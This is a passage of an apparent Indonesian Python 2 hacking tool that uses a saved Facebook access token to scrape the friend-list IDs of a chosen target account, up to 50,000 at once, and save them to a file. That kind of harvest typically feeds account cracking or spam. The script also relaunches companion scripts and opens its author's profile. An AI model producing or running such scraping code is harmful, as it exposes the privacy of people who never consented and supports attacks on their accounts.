		print("\r\033[1;97m[\033[1;95m+\033[1;97m] \033[1;97mFile tersimpan : \033[1;97mout/"+done)
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		raw_input("\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 UNIS3X.py")
	except IOError:
		print"\033[1;91m[!] Gagal membuat file"
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti !")
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Gagal !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except OSError:
		print('\033[1;97m[\033[1;95m!\033[1;97m]\033[1;97m File anda tidak tersimpan !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 UNIS3X.py")
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[×] Tidak ada koneksi !"
		keluar()

##### ID PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print "\033[1;97m ══════════════════════════════════════════"
		idt = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] \033[1;97mNama Akun      : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;91m•\033[1;93m•\033[1;92m•\033[1;97m] ID Publik Tidak Ada !"
			raw_input("\n\033[1;97m[\033[1;97m Kembali \033[1;97m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] \033[1;97mMengambil Semua ID ...')
		print "\033[1;97m ══════════════════════════════════════════"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m [ \033[1;97m"+str(len(idfromteman))+"\033[1;97m ]\033[1;91m •\033[1;97m•\033[1;97m"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;97m ' + a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;93m•\033[1;97m] Total ID : %s"%(len(idfromteman))
		done = raw_input("\r\033[1;97m[\033[1;93m+\033[1;97m] \033[1;97mSimpan Nama File : ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[\033[1;95m√\033[1;97m] File tersimpan : out/"+done)
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except OSError:
		print"\033[1;97m[!] File Tidak Tersimpan "
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 anme.py")
	except IOError:
		print"\033[1;97m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		os.system("python2 anme.py")
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;97m[\033[1;95m!\033[1;97m] Teman tidak ada !')
		raw_input("\n\033[1;93m[\033[1;97m Kembali \033[1;93m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;91m✖\033[1;97m] Tidak ada koneksi !"
		keluar()
		
	
#######SAYA########
def saya():
	os.system ('clear')
	print logo
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
	os.system('xdg-open https://m.facebook.com/rony.ska.7')
	menu()




if __name__=='__main__':
        menu()
        masuk()